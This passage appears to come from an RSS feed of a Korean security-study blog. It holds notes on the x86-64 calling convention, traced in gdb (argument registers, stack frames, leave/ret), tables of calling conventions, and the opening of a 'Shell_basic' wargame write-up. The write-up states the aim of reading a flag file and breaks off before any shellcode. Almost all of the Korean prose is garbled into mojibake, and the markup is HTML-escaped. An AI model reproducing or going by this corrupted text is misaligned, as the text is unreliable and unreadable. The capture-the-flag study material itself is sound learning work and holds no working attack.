&lt;span class=&quot;nt&quot;&gt;-fno-omit-frame-pointer&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-o&lt;/span&gt; sysv sysv.c &lt;span class=&quot;nt&quot;&gt;-fno-pic&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-O0&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h3 id=&quot;ì¸ì-ì „ë‹¬&quot;&gt;ì¸ì ì „ë‹¬&lt;/h3&gt;

&lt;p&gt;ì´í›„ sysvì— gdbë¥¼ ë¶™ì—¬ ì‹¤í–‰í•˜ê³  ì¤‘ë‹¨ì ì„ callerì— ì„¤ì •í•´(&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;b caller&lt;/code&gt;) ì¤‘ë‹¨ì ê¹Œì§€ ì‹¤í–‰í•œë‹¤.(&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;r&lt;/code&gt;)&lt;/p&gt;

&lt;p&gt;ì‹¤í–‰ ê²°ê³¼ ì•„ë˜ì™€ ê°™ì€ Contextë¥¼ í™•ì¸í•  ìˆ˜ ìˆì—ˆë‹¤.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/posts/syshack5/Untitled%203.jpeg&quot; alt=&quot;Untitled&quot; /&gt;&lt;/p&gt;

&lt;p&gt;CallerëŠ” Calleeì—ê²Œ ì „ë‹¬í•  ì¸ìë¥¼ ê±°ê¾¸ë¡œ ì €ì¥í•œë‹¤. í˜¹ì‹œë¼ë„ ì¸ìë¥¼ 6ê°œ ì´ˆê³¼í•˜ì—¬ ì¤„ ë•Œë¥¼ ëŒ€ë¹„í•´, ì¦‰ ìŠ¤íƒì„ ì‚¬ìš©í•  ë•Œë¥¼ ëŒ€ë¹„í•´ ì „ë‹¬í•  ì¸ìë¥¼ ê±°ê¾¸ë¡œ ì €ì¥í•˜ëŠ” ê²ƒ ê°™ì•˜ë‹¤.(ì¶”ì¸¡)&lt;/p&gt;

&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;&amp;lt;caller+10&amp;gt;&lt;/code&gt;~ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;&amp;lt;caller+37&amp;gt;&lt;/code&gt; ì—ì„œëŠ” ì¸ìë¥¼ ë ˆì§€ìŠ¤í„°ì— ì €ì¥í•˜ì§€ë§Œ, 7ë²ˆì§¸ ì¸ìë¥¼ ì €ì¥í•˜ëŠ” &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;&amp;lt;caller+8&amp;gt;&lt;/code&gt; ì—ì„œëŠ” ìŠ¤íƒì— pushí•˜ëŠ” ê²ƒì„ í™•ì¸í•  ìˆ˜ ìˆì—ˆë‹¤.&lt;/p&gt;

&lt;p&gt;ì´ì œ Callee í•¨ìˆ˜ë¥¼ í˜¸ì¶œí•˜ê¸° ì „ê¹Œì§€ ì‹¤í–‰í•´ ë³´ì. &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;b *caller+47&lt;/code&gt; ë¡œ ì¤‘ë‹¨ì ì„ ê±¸ê³  &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;c&lt;/code&gt; ëª…ë ¹ì–´ë¡œ í•´ë‹¹ ì¤‘ë‹¨ì ê¹Œì§€ ì‹¤í–‰í•˜ë©´ ëœë‹¤.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/posts/syshack5/Untitled%204.jpeg&quot; alt=&quot;Untitled&quot; /&gt;&lt;/p&gt;

&lt;p&gt;ìœ„ì˜ REGISTER Contextë¥¼ í™•ì¸í•˜ë©´ rdi, rsi, rdx, rcx, r8, r9ì˜ ë ˆì§€ìŠ¤í„°ì— ì „ë‹¬í•˜ê³ ì í•˜ëŠ” ì¸ìê°€ ë“¤ì–´ê°€ ìˆê³ , RSPì¦‰ ìŠ¤íƒì˜ ë§¨ ê¼­ëŒ€ê¸°ì— ë ˆì§€ìŠ¤í„°ì— ë“¤ì–´ê°€ì§€ ëª»í•œ ì¸ìê°€ ë‹´ê²¨ ìˆìŒì„ ë³¼ ìˆ˜ ìˆë‹¤.&lt;/p&gt;

&lt;p&gt;(ê·¸ëŸ¬ê³  ë³´ë‹ˆ, gdb pwndbgì˜ register contextì— ë‚˜ì—´ëœ ë ˆì§€ìŠ¤í„° ì¤‘ ì•ì— *ê°€ ë¶™ì€ ê±´ í•¨ìˆ˜ì˜ ì¸ì, ìŠ¤íƒê³¼ ê´€ë ¨ëœ ë ˆì§€ìŠ¤í„°ì˜€êµ¬ë‚˜!)&lt;/p&gt;

&lt;h3 id=&quot;ë°˜í™˜-ì£¼ì†Œ--ìŠ¤íƒ-í”„ë ˆì„-ì €ì¥&quot;&gt;ë°˜í™˜ ì£¼ì†Œ &amp;amp; ìŠ¤íƒ í”„ë ˆì„ ì €ì¥&lt;/h3&gt;

&lt;p&gt;ì´ì œ si ëª…ë ¹ì–´ë¡œ Calleeì˜ ë‚´ë¶€ë¡œ ë“¤ì–´ê°€ ë³´ì.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/posts/syshack5/Untitled%205.jpeg&quot; alt=&quot;Untitled&quot; /&gt;&lt;/p&gt;

&lt;p&gt;ë¬´ì—‡ë³´ë‹¤ ëˆˆì— ë„ëŠ” ê±´ STACK contextì—ì„œ í™•ì¸í•  ìˆ˜ ìˆëŠ” ìŠ¤íƒ êµ¬ì¡°ì´ë‹¤.&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;caller+52&lt;/code&gt;, ì¦‰ Calleeê°€ ë¦¬í„´í•œ í›„ ì´ì–´ì„œ ìˆ˜í–‰ë˜ì–´ì•¼ í•  ì¸ìŠ¤íŠ¸ëŸ­ì…˜ì˜ ì£¼ì†Œê°€ ìŠ¤íƒ ê¼­ëŒ€ê¸°ì— ì €ì¥ë˜ì–´ ìˆëŠ” í˜•íƒœ.
    &lt;ul&gt;
      &lt;li&gt;&lt;a href=&quot;https://toubva.github.io/blog/system-hacking-step2-2/#/&quot;&gt;ì´ì „&lt;/a&gt;ì— ê³µë¶€í–ˆë˜ ê²ƒì²˜ëŸ¼ Callee í•¨ìˆ˜ì˜ ìŠ¤íƒ í”„ë ˆì„ì´ ìƒì„±ë˜ê¸° ì§ì „ì— Calleeê°€ ë¦¬í„´ë˜ê³  ì½”ë“œ í”Œë¡œìš°ê°€ ì´ì–´ì ¸ì•¼ í•  ì¸ìŠ¤íŠ¸ëŸ­ì…˜ì˜ ì£¼ì†Œê°€ ìŠ¤íƒì— pushëœë‹¤ëŠ” ê²ƒì„ ìƒê¸°í•  ìˆ˜ ìˆë‹¤.&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;Callee í•¨ìˆ˜ì˜ prologue.
    &lt;ul&gt;
      &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;push rbp&lt;/code&gt; ë¥¼ í†µí•´ Callerì˜ rbpë¥¼ ì €ì¥í•˜ê³ , ìŠ¤íƒ ê¼­ëŒ€ê¸°(rsp)ì˜ ì£¼ì†Œë¥¼ ìŠ¤íƒ ë°‘ë°”ë‹¥(rbp)ë¡œ ì„¤ì •í•´ í˜„ì¬ í•¨ìˆ˜ì˜ ìŠ¤íƒ í”„ë ˆì„ì„ ë§Œë“œëŠ” ëª¨ìŠµì„ ë³¼ ìˆ˜ ìˆë‹¤.&lt;/li&gt;
      &lt;li&gt;
        &lt;p&gt;ì´í›„ Calleeê°€ ë¦¬í„´ë˜ë©´ ì €ì¥ë˜ì—ˆë˜ Callerì˜ rbpë¥¼ êº¼ë‚´ê³ , ì´ì–´ì„œ ìˆ˜í–‰ë  ì¸ìŠ¤íŠ¸ëŸ­ì…˜ì˜ ì£¼ì†Œë¥¼ êº¼ë‚´ë©´ì„œ Callerì˜ ìŠ¤íƒ í”„ë ˆì„ìœ¼ë¡œ ëŒì•„ê°ˆ ìˆ˜ ìˆë‹¤.&lt;/p&gt;

        &lt;p&gt;+) rbpëŠ” ìŠ¤íƒ í”„ë ˆì„ì˜ ë°‘ë°”ë‹¥ì„ ê°€ë¦¬í‚¤ëŠ” í¬ì¸í„°ì´ê¸° ë•Œë¬¸ì— SFP(Stack Frame Pointer)ë¼ê³ ë„ ë¶€ë¥¸ë‹¤.&lt;/p&gt;

        &lt;p&gt;&lt;img src=&quot;/assets/img/posts/syshack5/Untitled%206.jpeg&quot; alt=&quot;push rbpê°€ ìˆ˜í–‰ë˜ê¸° ì§ì „ì˜ ìŠ¤íƒ ìƒíƒœ. ì•„ì§ Callerì˜ rbpê°€ ì €ì¥ë˜ì§€ ì•Šì•˜ë‹¤.&quot; /&gt;&lt;/p&gt;

        &lt;p&gt;push rbpê°€ ìˆ˜í–‰ë˜ê¸° ì§ì „ì˜ ìŠ¤íƒ ìƒíƒœ. ì•„ì§ Callerì˜ rbpê°€ ì €ì¥ë˜ì§€ ì•Šì•˜ë‹¤.&lt;/p&gt;

        &lt;p&gt;&lt;img src=&quot;/assets/img/posts/syshack5/Untitled%207.jpeg&quot; alt=&quot;push rbpê°€ ìˆ˜í–‰ëœ ì§í›„ì˜ ìŠ¤íƒ ìƒíƒœ. rspì— í˜„ì¬ rbpì˜ ê°’ì´ ì €ì¥ë˜ì–´ ìˆëŠ” ê²ƒì„ ë³¼ ìˆ˜ ìˆë‹¤.&quot; /&gt;&lt;/p&gt;

        &lt;p&gt;push rbpê°€ ìˆ˜í–‰ëœ ì§í›„ì˜ ìŠ¤íƒ ìƒíƒœ. rspì— í˜„ì¬ rbpì˜ ê°’ì´ ì €ì¥ë˜ì–´ ìˆëŠ” ê²ƒì„ ë³¼ ìˆ˜ ìˆë‹¤.&lt;/p&gt;
      &lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&quot;ìƒˆë¡œìš´-ìŠ¤íƒ-í”„ë ˆì„-í• ë‹¹&quot;&gt;ìƒˆë¡œìš´ ìŠ¤íƒ í”„ë ˆì„ í• ë‹¹&lt;/h3&gt;

&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;push rbp&lt;/code&gt; ë‹¤ìŒ ì¸ìŠ¤íŠ¸ëŸ­ì…˜ì¸ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;push rbp, rsp&lt;/code&gt; ë¥¼ ì‹¤í–‰í•´ ë³´ì. ì¦‰, rsp ê°’ì„ rbpì— ë„£ìŒìœ¼ë¡œì¨ &lt;strong&gt;Calleeë¥¼ ìœ„í•œ ìƒˆë¡œìš´ ìŠ¤íƒ í”„ë ˆì„ì„ í• ë‹¹&lt;/strong&gt;í•˜ëŠ” ê²ƒì´ë‹¤.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/posts/syshack5/Untitled%208.jpeg&quot; alt=&quot;rspì™€ rbpê°€ ì¼ì¹˜í•˜ëŠ” ìƒí™©ì¸ ê²ƒì„ í™•ì¸í•  ìˆ˜ ìˆë‹¤. ì´ë ‡ê²Œ ìƒˆë¡œìš´ ìŠ¤íƒ í”„ë ˆì„ì˜ ê¸°ë°˜ì´ ì™„ì„±ëœë‹¤!&quot; /&gt;&lt;/p&gt;

&lt;p&gt;rspì™€ rbpê°€ ì¼ì¹˜í•˜ëŠ” ìƒí™©ì¸ ê²ƒì„ í™•ì¸í•  ìˆ˜ ìˆë‹¤. ì´ë ‡ê²Œ ìƒˆë¡œìš´ ìŠ¤íƒ í”„ë ˆì„ì˜ ê¸°ë°˜ì´ ì™„ì„±ëœë‹¤!&lt;/p&gt;

&lt;p&gt;ë§Œì¼ Calleeì—ì„œ ì§€ì—­ ë³€ìˆ˜ë¥¼ ì„ ì–¸í–ˆë‹¤ë©´ ìŠ¤íƒì— ì§€ì—­ ë³€ìˆ˜ë¥¼ ì €ì¥í•´ì•¼ í•˜ê¸° ë•Œë¬¸ì— rspì˜ ê°’ì„ ëº„ í…ë°, ì§€ì—­ ë³€ìˆ˜ë¥¼ ì„ ì–¸í•˜ì§€ ì•Šê¸° ë•Œë¬¸ì— ì•„ë˜ ì¸ìŠ¤íŠ¸ëŸ­ì…˜ì—ì„œ ë³¼ ìˆ˜ ìˆë“¯ rspì˜ ê°’ì„ ë¹¼ì§€ ì•Šê³  ê·¸ëŒ€ë¡œ ì§„í–‰ëœë‹¤.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/posts/syshack5/Untitled%209.jpeg&quot; alt=&quot;Untitled&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;ì–´? ê·¸ëŸ°ë° ì´ìƒí•œ ì ì´ ìˆë‹¤. Callee í•¨ìˆ˜ë¥¼ ë‹¤ì‹œ ë³´ì.&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/posts/syshack5/Untitled%202.jpeg&quot; alt=&quot;Untitled&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Callee í•¨ìˆ˜ëŠ” retì´ë¼ëŠ” ì§€ì—­ ë³€ìˆ˜ë¥¼ ì„ ì–¸í•œë‹¤! ê·¸ëŸ°ë° Callee í•¨ìˆ˜ì˜ ì¸ìŠ¤íŠ¸ëŸ­ì…˜ì„ ë³´ë©´ rspì—ëŠ” ë³€ë™ì´ ì—†ë‹¤.&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;ê·¸ ì´ìœ ëŠ” gccì˜ ì»´íŒŒì¼ ë°©ì‹ ë•Œë¬¸ì´ì—ˆë‹¤.&lt;/strong&gt; ì–´ë–¤ &lt;strong&gt;ì§€ì—­ ë³€ìˆ˜ê°€ ì˜¤ë¡œì§€ ë°˜í™˜ ê°’ì„ ì €ì¥í•˜ëŠ” ìš©ë„ë¡œë§Œ&lt;/strong&gt; ì‚¬ìš©ë  ê²½ìš°, gccëŠ” &lt;strong&gt;ìŠ¤íƒì„ í• ë‹¹í•˜ì§€ ì•Šìœ¼ë©° raxë¥¼ ì§ì ‘ ì‚¬ìš©&lt;/strong&gt;í•œë‹¤ëŠ” ê²ƒ.&lt;/p&gt;

&lt;p&gt;íš¨ìœ¨ì ì¸ ìì› ì‚¬ìš©ì„ ìœ„í•œ í”„ë¡œê·¸ë˜ë¨¸ë“¤ì˜ ë…¸ë ¥ì„ ì •ë§ ì¡´ê²½í•˜ì§€ë§Œ, ê·¸ë¡œ ì¸í•´ ë°œìƒí•˜ëŠ” ì´ëŸ° ì˜ˆì™¸ë“¤ì„ ë³´ë©´ ë¨¸ë¦¬ë¥¼ ì¥ì–´ëœ¯ê²Œ ëœë‹¤(â€¦)&lt;/p&gt;

&lt;h3 id=&quot;ë°˜í™˜ê°’-ì „ë‹¬&quot;&gt;ë°˜í™˜ê°’ ì „ë‹¬&lt;/h3&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/posts/syshack5/Untitled%2010.jpeg&quot; alt=&quot;Untitled&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Callee í•¨ìˆ˜ì˜ ì „ì²´ ì¸ìŠ¤íŠ¸ëŸ­ì…˜ì„ ì‚´í´ ë³´ì. ê³„ì†í•´ì„œ ì£¼ì–´ì§„ ì¸ìë“¤ì„ ë”í•˜ë‹¤ê°€, ë§ˆì§€ë§‰ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;&amp;lt;callee+79&amp;gt;&lt;/code&gt; ~ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;&amp;lt;callee+91&amp;gt;&lt;/code&gt; ì—ì„œ &lt;strong&gt;ë¦¬í„´í•  ê°’ì„ raxì— ì €ì¥í•˜ê³ , í•¨ìˆ˜ë¥¼ ë§ˆë¬´ë¦¬&lt;/strong&gt;ì§“ê³  ìˆë‹¤. ì¦‰, &lt;strong&gt;í•¨ìˆ˜ì˜ Epilogueë¥¼ í™•ì¸&lt;/strong&gt;í•  ìˆ˜ ìˆë‹¤. ì´ì œ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;&amp;lt;callee+91&amp;gt;&lt;/code&gt;, ì¦‰ í•¨ìˆ˜ë¥¼ ë¦¬í„´í•˜ëŠ” ì¸ìŠ¤íŠ¸ëŸ­ì…˜ì— ì¤‘ë‹¨ì ì„ ê±¸ê³  raxë¥¼ í™•ì¸í•´ ë³´ì.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/posts/syshack5/Untitled%2011.jpeg&quot; alt=&quot;Untitled&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Calleeì— ì „ë‹¬í–ˆë˜ 7ê°œ ì¸ìì˜ í•©ì„ í™•ì¸í•  ìˆ˜ ìˆë‹¤.&lt;/p&gt;

&lt;h3 id=&quot;ë°˜í™˜&quot;&gt;ë°˜í™˜&lt;/h3&gt;

&lt;p&gt;ë°˜í™˜ì€ ì €ì¥í•´ë’€ë˜ Callerì˜ ìŠ¤íƒ í”„ë ˆì„ê³¼ ë°˜í™˜ ì¸ìŠ¤íŠ¸ëŸ­ì…˜ ì£¼ì†Œë¥¼ êº¼ë‚´ëŠ” ê³¼ì •ì´ë‹¤.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/posts/syshack5/Untitled%2012.jpeg&quot; alt=&quot;Untitled&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Callee í•¨ìˆ˜ê°€ ì§€ì—­ ë³€ìˆ˜ë¥¼ ì„ ì–¸í•˜ì§€ ì•Šì•˜ê¸° ë•Œë¬¸ì—(ë¦¬í„´ê°’ì„ ë‹´ëŠ” ë³€ìˆ˜ ì œì™¸) ìŠ¤íƒ í”„ë ˆì„ì„ ë§Œë“¤ì§€ ì•Šì•˜ê³ , ë”°ë¼ì„œ ë‹¨ìˆœíˆ pop rbpë¡œë§Œ ìŠ¤íƒ í”„ë ˆì„ì„ êº¼ë‚´ê³  ëë‚˜ëŠ” ê²ƒì„ í™•ì¸í•  ìˆ˜ ìˆë‹¤. ê·¸ëŸ¬ë‚˜, ì¼ë°˜ì ì¸ ê²½ìš°-ì¦‰, ì§€ì—­ ë³€ìˆ˜ë¥¼ ì„ ì–¸í•˜ëŠ” ê²½ìš°ì—ëŠ” ìŠ¤íƒ í”„ë ˆì„ì´ ìƒì„±ë˜ì—ˆê¸° ë•Œë¬¸ì— leaveë¡œ ìŠ¤íƒ í”„ë ˆì„ì„ êº¼ë‚¸ë‹¤ëŠ” ì ì„ ê¼­ ì—¼ë‘ì— ë‘ì.&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;
    &lt;table&gt;
      &lt;tbody&gt;
        &lt;tr&gt;
          &lt;td&gt;leaveëŠ” mov rsp, rbp&lt;/td&gt;
          &lt;td&gt;pop rbp ë¥¼ í•©ì³ ë‘” ëª…ë ¹ì–´ì´ë‹¤.&lt;/td&gt;
        &lt;/tr&gt;
      &lt;/tbody&gt;
    &lt;/table&gt;
  &lt;/li&gt;
  &lt;li&gt;ì¦‰, í™•ë³´ëœ ìŠ¤íƒ ê³µê°„ì„ ë²„ë¦¬ê³  ì´ì „ ìŠ¤íƒ í”„ë ˆì„ì˜ rbp êº¼ë‚´ ì˜¤ëŠ” ëª…ë ¹ì–´ì´ë‹¤.&lt;/li&gt;
  &lt;li&gt;ì´ë¥¼ ë‹¤ì‹œ ë§í•˜ë©´ í˜„ì¬ ìŠ¤íƒ í”„ë ˆì„ì„ ë²„ë¦¬ê³  ì´ì „ ìŠ¤íƒ í”„ë ˆì„ì„ êº¼ë‚´ëŠ” ê²ƒì´ë‹¤.&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;ìŠ¤íƒ í”„ë ˆì„ì„ êº¼ë‚¸ ì´í›„ì—ëŠ” retìœ¼ë¡œ Callerì—ê²Œ ë³µê·€í•œë‹¤. ë³µê·€í•  ë•Œ ë³€í™”í•˜ëŠ” ê²ƒì€ ì•ì„œ ì„¤ëª…í–ˆë“¯ rbpì™€ ripì´ë¯€ë¡œ ret ì¸ìŠ¤íŠ¸ëŸ­ì…˜ì„ ìˆ˜í–‰í•œ ì§í›„ ê·¸ ë‘˜ì„ ì‚´í´ë³´ì•˜ë‹¤.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/posts/syshack5/Untitled%2013.jpeg&quot; alt=&quot;rbpê°€ Callerì˜ rbpë¡œ ë°”ë€ ëª¨ìŠµ.&quot; /&gt;&lt;/p&gt;

&lt;p&gt;rbpê°€ Callerì˜ rbpë¡œ ë°”ë€ ëª¨ìŠµ.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/posts/syshack5/Untitled%2014.jpeg&quot; alt=&quot;ripê°€ ë¦¬í„´ ì£¼ì†Œë¡œ ì„¤ì •ë˜ì–´ ìˆëŠ” ëª¨ìŠµ.&quot; /&gt;&lt;/p&gt;

&lt;p&gt;ripê°€ ë¦¬í„´ ì£¼ì†Œë¡œ ì„¤ì •ë˜ì–´ ìˆëŠ” ëª¨ìŠµ.&lt;/p&gt;

&lt;h1 id=&quot;5-ë¶€ë¡-í•¨ìˆ˜-í˜¸ì¶œ-ê·œì•½&quot;&gt;5. ë¶€ë¡-í•¨ìˆ˜ í˜¸ì¶œ ê·œì•½&lt;/h1&gt;

&lt;p&gt;&lt;strong&gt;x86 í•¨ìˆ˜ í˜¸ì¶œ ê·œì•½&lt;/strong&gt;&lt;/p&gt;

&lt;table&gt;
  &lt;thead&gt;
    &lt;tr&gt;
      &lt;th&gt;í•¨ìˆ˜í˜¸ì¶œê·œì•½&lt;/th&gt;
      &lt;th&gt;ì‚¬ìš© ì»´íŒŒì¼ëŸ¬&lt;/th&gt;
      &lt;th&gt;ì¸ì ì „ë‹¬ ë°©ì‹&lt;/th&gt;
      &lt;th&gt;ìŠ¤íƒ ì •ë¦¬&lt;/th&gt;
      &lt;th&gt;ì ìš©&lt;/th&gt;
    &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
    &lt;tr&gt;
      &lt;td&gt;stdcall&lt;/td&gt;
      &lt;td&gt;MSVC&lt;/td&gt;
      &lt;td&gt;Stack&lt;/td&gt;
      &lt;td&gt;Callee&lt;/td&gt;
      &lt;td&gt;WINAPI&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;cdecl&lt;/td&gt;
      &lt;td&gt;GCC, MSVC&lt;/td&gt;
      &lt;td&gt;Stack&lt;/td&gt;
      &lt;td&gt;Caller&lt;/td&gt;
      &lt;td&gt;ì¼ë°˜ í•¨ìˆ˜&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;fastcall&lt;/td&gt;
      &lt;td&gt;MSVC&lt;/td&gt;
      &lt;td&gt;ECX, EDX&lt;/td&gt;
      &lt;td&gt;Callee&lt;/td&gt;
      &lt;td&gt;ìµœì í™”ëœ í•¨ìˆ˜&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;thiscall&lt;/td&gt;
      &lt;td&gt;MSVC&lt;/td&gt;
      &lt;td&gt;ECX(ì¸ìŠ¤í„´ìŠ¤),Stack(ì¸ì)&lt;/td&gt;
      &lt;td&gt;Callee&lt;/td&gt;
      &lt;td&gt;í´ë˜ìŠ¤ì˜ í•¨ìˆ˜&lt;/td&gt;
    &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;

&lt;p&gt;&lt;strong&gt;x86-64 í•¨ìˆ˜ í˜¸ì¶œ ê·œì•½&lt;/strong&gt;&lt;/p&gt;

&lt;table&gt;
  &lt;thead&gt;
    &lt;tr&gt;
      &lt;th&gt;í•¨ìˆ˜í˜¸ì¶œê·œì•½&lt;/th&gt;
      &lt;th&gt;ì‚¬ìš© ì»´íŒŒì¼ëŸ¬&lt;/th&gt;
      &lt;th&gt;ì¸ì ì „ë‹¬ ë°©ì‹&lt;/th&gt;
      &lt;th&gt;ìŠ¤íƒ ì •ë¦¬&lt;/th&gt;
      &lt;th&gt;ì ìš©&lt;/th&gt;
    &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
    &lt;tr&gt;
      &lt;td&gt;MS ABI&lt;/td&gt;
      &lt;td&gt;MSVC&lt;/td&gt;
      &lt;td&gt;RCX, RDX, R8, R9&lt;/td&gt;
      &lt;td&gt;Caller&lt;/td&gt;
      &lt;td&gt;ì¼ë°˜ í•¨ìˆ˜,Windows Syscall&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;System ABI&lt;/td&gt;
      &lt;td&gt;GCC&lt;/td&gt;
      &lt;td&gt;RDI, RSI, RDX, RCX, R8, R9, XMM0â€“7&lt;/td&gt;
      &lt;td&gt;Caller&lt;/td&gt;
      &lt;td&gt;ì¼ë°˜ í•¨ìˆ˜&lt;/td&gt;
    &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;
</description>
        <pubDate>Fri, 12 Aug 2022 21:25:23 +0900</pubDate>
        <link>http://localhost:4000/blog/system-hacking-step5/</link>
        <guid isPermaLink="true">http://localhost:4000/blog/system-hacking-step5/</guid>
      </item>
    
      <item>
        <title>System Hackig Step 4-2: Shell_basic</title>
        <description>&lt;h1 id=&quot;stage-4-2-shell_basic&quot;&gt;STAGE 4-2: Shell_basic&lt;/h1&gt;

&lt;ul&gt;
  &lt;li&gt;ì´ë²ˆ ìŠ¤í…Œì´ì§€ëŠ” ë¬¸ì œë¥¼ ììœ¨ì ìœ¼ë¡œ í’€ì–´ë³´ëŠ” ìŠ¤í…Œì´ì§€ì´ë‹¤.&lt;/li&gt;
  &lt;li&gt;ì§ì „ ìŠ¤í…Œì´ì§€ì—ì„œ ë¬¸ì œë¥¼ í•´ê²°í–ˆë˜ ë°©ì‹ìœ¼ë¡œ ì ‘ê·¼í•˜ë©° ë¬¸ì œ í’€ì´ ì‚¬ê³ ë°©ì‹ì„ ì²´í™”í•˜ëŠ” ê²ƒì„ ëª©í‘œë¡œ ì‚¼ì•˜ë‹¤.&lt;/li&gt;
&lt;/ul&gt;

&lt;hr /&gt;

&lt;h1 id=&quot;ë¬¸ì œ-í’€ì´-ê³¼ì •-ì„¤ì •í•˜ê¸°&quot;&gt;ë¬¸ì œ í’€ì´ ê³¼ì • ì„¤ì •í•˜ê¸°&lt;/h1&gt;

&lt;ol&gt;
  &lt;li&gt;ì½”ë“œì˜ ë‚´ìš© í™•ì¸&lt;/li&gt;
  &lt;li&gt;ìµìŠ¤í”Œë¡œì‡ ê°€ëŠ¥ ë¶€ë¶„ í™•ì¸&lt;/li&gt;
  &lt;li&gt;ìµìŠ¤í”Œë¡œì‡ ë‹¹ì‹œì˜ ìŠ¤íƒ êµ¬ì¡° ì²´í¬&lt;/li&gt;
  &lt;li&gt;í˜ì´ë¡œë“œ ì´ˆì•ˆ ì‘ì„±&lt;/li&gt;
  &lt;li&gt;ìµìŠ¤í”Œë¡œì‡ ì½”ë“œ ì‘ì„±&lt;/li&gt;
&lt;/ol&gt;

&lt;hr /&gt;

&lt;h1 id=&quot;1-1-ì½”ë“œì˜-ë‚´ìš©-í™•ì¸&quot;&gt;1. (1) ì½”ë“œì˜ ë‚´ìš© í™•ì¸&lt;/h1&gt;

&lt;p&gt;ì…ë ¥í•œ ì…¸ì½”ë“œë¥¼ ì‹¤í–‰í•˜ëŠ” í”„ë¡œê·¸ë¨ì´ë‹¤. ë§¨ ì²˜ìŒì—ëŠ” ë¬¸ì œì—ì„œ ë¯¸ë¦¬ ì„¤ëª…í•´ì¤€ ê²ƒì„ ì´í•´í•˜ì§€ ëª»í•˜ê³  BOFë¥¼ ì“°ëŠ” ê±¸ê¹Œ? ì‹¶ì—ˆì§€ë§Œ ì½”ë“œë¥¼ ì°¬ì°¬íˆ ì½ì–´ë³´ë‹ˆ ê·¸ëƒ¥ ë‚´ê°€ ì…ë ¥í•œ ì…¸ì½”ë“œë¥¼ ì‹¤í–‰í•´ ì£¼ëŠ” í”„ë¡œê·¸ë¨ì´ì—ˆë‹¤â€¦.&lt;/p&gt;

&lt;p&gt;ë”°ë¼ì„œ ëª¨ë‘ ë›°ì–´ë„˜ê³  5ë²ˆì„ ìˆ˜í–‰í•˜ë©´ ë˜ê² ë‹¤.&lt;/p&gt;

&lt;h1 id=&quot;2-5-ìµìŠ¤í”Œë¡œì‡-ì½”ë“œ-ì‘ì„±&quot;&gt;2. (5) ìµìŠ¤í”Œë¡œì‡ ì½”ë“œ ì‘ì„±&lt;/h1&gt;

&lt;p&gt;ë‚´ê°€ ì›í•˜ëŠ” ë™ì‘ì„ ì •ë¦¬í•´ ë³´ì.&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;cat /home/shell_basic/flag_name_is_loooooong&lt;/p&gt;

&lt;/blockquote&gt;

